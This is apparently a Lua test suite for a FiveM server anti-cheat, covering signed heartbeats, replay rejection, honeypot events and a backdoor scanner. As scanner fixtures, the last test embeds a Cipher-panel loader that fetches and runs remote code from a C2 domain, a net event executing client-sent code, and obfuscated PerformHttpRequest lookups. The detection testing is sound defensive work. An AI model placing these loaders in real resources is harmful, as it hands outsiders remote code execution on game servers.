-- Scénarios : canal signé + heartbeat, rapports client, pièges, registre d'événements, scanner.
local T = dofile('tests/lib/t.lua')
local F = dofile('tests/mocks/fivem.lua')

local function boot(resources)
    local env = F.new({ resources = resources })
    env:loadManifest('[rempart]/rempart', 'server')
    local G = env.G
    G.Config.Punish.screenshot = false
    G.Config.Punish.dropDelay = 0
    env:advance(15000)
    return env, G
end

local function join(env, src, data)
    env:addPlayer(src, data)
    env:trigger('playerJoining', 'internal:' .. src, '0')
    local P = env.G.Rempart.Players.get(src)
    P.graceUntil = 0
    return P
end

local function lastClientEvent(env, target, kind)
    for i = #env.clientEvents, 1, -1 do
        local e = env.clientEvents[i]
        if e.name == 'rempart:s' and e.target == target and e.args[1] == kind then return e.args[2] end
    end
    return nil
end

local function dropped(env, src)
    for _, d in ipairs(env.dropped) do if d.src == src then return d.reason end end
    return nil
end

local function has(G, src, id)
    local P = G.Rempart.Players.get(src)
    for _, h in ipairs(P and P.hist:list() or {}) do if h.id == id then return true end end
    return false
end

--- Client simulé : poignée de main + envoi de messages signés.
local function client(env, src, resList)
    local c = { seq = 0 }
    env:trigger('rempart:c', src, 'hello', 0, '', { v = '1.0.0', res = resList or { 'rempart' } })
    local init = lastClientEvent(env, src, 'init')
    c.key = init and init.key
    function c.send(kind, payload, extra, badMac)
        c.seq = c.seq + 1
        local mac = badMac and string.rep('0', 64) or env.G.Utils.signature(c.key, kind, c.seq, extra)
        env:trigger('rempart:c', src, kind, c.seq, mac, payload, extra)
    end
    function c.pong()
        local ping = lastClientEvent(env, src, 'ping')
        c.send('pong', { n = ping.n, rc = 12 }, ping.nonce)
    end
    return c
end

-- ─────────────────────────────────────────────────────────────────────────────

T.case('canal : poignée de main, clé de session et configuration envoyée', function()
    local env, G = boot()
    join(env, 1)
    local c = client(env, 1)
    T.ok(c.key and #c.key == 64, 'clé de 256 bits')
    local init = lastClientEvent(env, 1, 'init')
    T.ok(init.cfg.checks and init.cfg.weaponBlacklist, 'configuration client')
    T.eq(init.cfg.webhooks, nil, 'aucun secret envoyé au client')
    T.ok(G.Rempart.Players.get(1).session, 'session ouverte')
end)

T.case('heartbeat : réponses signées acceptées pendant 2 minutes', function()
    local env, G = boot()
    join(env, 2)
    local c = client(env, 2)
    for _ = 1, 8 do
        env:advance(15100)
        c.pong()
    end
    local s = G.Rempart.Players.get(2).session
    T.eq(s.missed, 0)
    T.eq(s.pending, nil)
    T.eq(dropped(env, 2), nil)
end)

T.case('heartbeat : client muet => kick (jamais de ban)', function()
    local env, G = boot()
    join(env, 3)
    client(env, 3)
    env:advance(15100 * 6)
    local reason = dropped(env, 3)
    T.ok(reason and reason:find('Expulsé'), 'kick : ' .. tostring(reason))
    T.eq(G.Rempart.Bans.count(), 0, 'aucun ban')
end)

T.case('heartbeat : client anti-cheat jamais démarré => kick', function()
    local env = boot()
    join(env, 4)
    env:advance(301000)
    T.ok((dropped(env, 4) or ''):find('module anti%-cheat'), 'kick client_missing')
end)

T.case('canal : signatures falsifiées => ban', function()
    local env, G = boot()
    join(env, 5)
    local c = client(env, 5)
    for _ = 1, 3 do c.send('detect', { id = 'client_godmode' }, nil, true) end
    env:advance(100)
    T.ok((dropped(env, 5) or ''):find('banni'), 'ban pour falsification')
    T.ok(G.Rempart.Bans.match({ 'license:lic5' }, {}))
end)

T.case('canal : rejeu d\'un message signé ignoré', function()
    local env, G = boot()
    join(env, 6)
    local c = client(env, 6)
    c.send('detect', { id = 'client_vision', d = {} })
    local before = #G.Rempart.Players.get(6).hist:list()
    -- rejeu identique (même séquence)
    env:trigger('rempart:c', 6, 'detect', 1, env.G.Utils.signature(c.key, 'detect', 1, nil), { id = 'client_vision', d = {} })
    T.eq(#G.Rempart.Players.get(6).hist:list(), before, 'rejeu sans effet')
end)

T.case('rapports client : seules les détections client sont acceptées', function()
    local env, G = boot()
    join(env, 7)
    local c = client(env, 7)
    c.send('detect', { id = 'event_honeypot', d = {} })
    T.ok(not has(G, 7, 'event_honeypot'), 'détection serveur refusée depuis le client')
    c.send('detect', { id = 'client_spectate', d = { x = string.rep('a', 5000) } })
    T.ok(has(G, 7, 'client_spectate'), 'détection client acceptée')
end)

T.case('ressources : injection détectée, ressources internes tolérées', function()
    local env, G = boot()
    join(env, 8)
    client(env, 8, { 'rempart', '_cfx_internal' })
    T.ok(not has(G, 8, 'resource_injected'), '_cfx_internal toléré')
    join(env, 9)
    client(env, 9, { 'rempart', 'kdj3k2_eulen' })
    env:advance(100)
    T.ok((dropped(env, 9) or ''):find('banni'), 'ressource injectée => ban')
end)

T.case('ressources : arrêt local confirmé 10 s après (pas de faux positif à la déconnexion)', function()
    local env, G = boot({ chat = { state = 'started', meta = {}, files = {} } })
    join(env, 10)
    local c = client(env, 10)
    c.send('stop', { name = 'chat' })
    -- le joueur quitte avant la confirmation
    env:trigger('playerDropped', 'internal:10', 'Quitting')
    env.players[10] = nil
    env:advance(11000)
    T.eq(G.Rempart.Bans.count(), 0, 'aucun ban pour un joueur qui quitte')

    join(env, 11)
    local c2 = client(env, 11)
    c2.send('stop', { name = 'chat' })
    env:advance(11000)
    T.ok((dropped(env, 11) or ''):find('banni'), 'resource stopper banni')
end)

T.case('commandes : commande enregistrée par une ressource inconnue => injection', function()
    local env = boot()
    join(env, 12)
    local c = client(env, 12)
    c.send('detect', { id = 'command_injected', d = { name = 'menu', resource = 'xX_injected_Xx' } })
    env:advance(100)
    T.ok((dropped(env, 12) or ''):find('banni'))
end)

-- ─────────────────────────────────────────────────────────────────────────────
-- Pièges et registre d'événements
-- ─────────────────────────────────────────────────────────────────────────────

local function serverRes(files)
    local meta = { server_script = {} }
    for path in pairs(files) do meta.server_script[#meta.server_script + 1] = path end
    return { state = 'started', meta = meta, files = files }
end

T.case('événements : registre statique et désarmement des pièges existants', function()
    local env, G = boot({
        esx_garbagejob = serverRes({ ['server/main.lua'] = "RegisterNetEvent('esx_garbagejob:pay', function() end)" }),
        myjob = serverRes({ ['sv.lua'] = "RegisterServerEvent('jobs:reward')\nonNet('jobs:js', () => {})\n"
            .. "RegisterNetEvent('dyn:' .. name)" }),
    })
    local E = G.Rempart.Events
    T.ok(E.registry['jobs:reward'] and E.registry['jobs:js'], 'événements recensés (Lua + JS)')
    T.ok(E.prefixes['dyn:'], 'préfixe dynamique')
    T.ok(not E.honeypots['esx_garbagejob:pay'], 'piège désarmé : la ressource existe')
    T.ok(E.honeypots['esx_truckerjob:pay'], 'piège armé : ressource absente')
end)

T.case('pièges : déclenchement => ban ; désarmement si plusieurs joueurs', function()
    local env, G = boot()
    join(env, 20)
    env:trigger('rempart:sensor:hit', '', 20, 'honeypot', { event = 'esx_truckerjob:pay', size = 30 })
    env:advance(100)
    T.ok((dropped(env, 20) or ''):find('banni'), 'tricheur banni')

    -- un « piège » utilisé par 3 joueurs distincts est en fait légitime
    G.Config.AuditMode = true
    for i = 21, 23 do
        join(env, i)
        env:trigger('rempart:sensor:hit', '', i, 'honeypot', { event = 'esx_pizza:pay', size = 30 })
    end
    T.ok(not G.Rempart.Events.honeypots['esx_pizza:pay'], 'piège désarmé automatiquement')
end)

T.case('pièges : ressource démarrée à chaud qui enregistre l\'événement => aucune sanction', function()
    local env, G = boot()
    T.ok(G.Rempart.Events.honeypots['js:jailuser'], 'piège armé au démarrage')
    join(env, 25)
    env.resources.jailsystem = serverRes({ ['server.lua'] = "RegisterNetEvent('js:jailuser', function(id, t) end)" })
    env:trigger('onResourceStart', '', 'jailsystem')
    -- un joueur utilise la nouvelle ressource avant la fin de son indexation
    env:trigger('rempart:sensor:hit', '', 25, 'honeypot', { event = 'js:jailuser', size = 20 })
    env:advance(5000)
    T.eq(dropped(env, 25), nil, 'aucune sanction')
    T.ok(not G.Rempart.Events.honeypots['js:jailuser'], 'piège désarmé après indexation')
end)

T.case('pièges : un client ne peut pas usurper le capteur', function()
    local env, G = boot()
    join(env, 24)
    -- l'événement du capteur n'est pas enregistré comme événement réseau
    env:trigger('rempart:sensor:hit', 24, 24, 'honeypot', { event = 'esx_truckerjob:pay' })
    env:advance(100)
    T.eq(dropped(env, 24), nil)
    T.eq(G.Rempart.Bans.count(), 0)
end)

-- ─────────────────────────────────────────────────────────────────────────────
-- Scanner de backdoors
-- ─────────────────────────────────────────────────────────────────────────────

T.case('scanner : Cipher, porte dérobée réseau, obfuscation ; ox_lib non signalé', function()
    local cipher = "PerformHttpRequest('https://cipher-panel.me/_i/i?to=XyZ', function (e, d) local s = assert(load(d)) if (d == nil) then return end s() end)"
    local hex = 'local p = _G["\\x50\\x65\\x72\\x66\\x6f\\x72\\x6d\\x48\\x74\\x74\\x70\\x52\\x65\\x71\\x75\\x65\\x73\\x74"]'
    local schar = 'local p = _G[string.char(80,101,114,102,111,114,109,72,116,116,112,82,101,113,117,101,115,116)]'
    local netload = "RegisterNetEvent('helpCode', function(code) local f = load(code) f() end)"
    local oxlib = [[
RegisterNetEvent('ox_lib:notify', function(data) lib.notify(data) end)
local chunk = LoadResourceFile(resource, file)
local fn, err = load(chunk, ('@@%s/%s'):format(resource, file))
]]
    local env = F.new({ resources = {
        infected = { state = 'started', meta = {}, files = { ['server/sv.lua'] = cipher } },
        obf = { state = 'stopped', meta = {}, files = { ['a.lua'] = hex, ['b.lua'] = schar } },
        rce = { state = 'started', meta = {}, files = { ['sv.lua'] = netload } },
        ox_lib = { state = 'started', meta = {}, files = { ['init.lua'] = oxlib } },
    } })
    env:loadManifest('[rempart]/rempart', 'server')
    env.G.Config.Scanner.onStart = false
    env:advance(15000)
    local findings
    env.G.Rempart.Scanner.run(function(f) findings = f end)
    env:advance(1000)
    T.ok(findings, 'analyse terminée')
    local byRes = {}
    for _, f in ipairs(findings) do
        byRes[f.res] = byRes[f.res] or {}
        byRes[f.res][f.id] = f.severity
    end
    T.eq((byRes.infected or {}).http_load, 'critical', 'loader Cipher')
    T.eq((byRes.infected or {}).known_c2, 'critical', 'domaine Cipher')
    T.eq((byRes.rce or {}).net_load, 'critical', 'exécution de code reçu d\'un client')
    T.eq((byRes.obf or {}).hidden_http, 'high', 'PerformHttpRequest obfusqué')
    T.eq(byRes.ox_lib, nil, 'ox_lib : aucun faux positif')
end)

return T.finish()
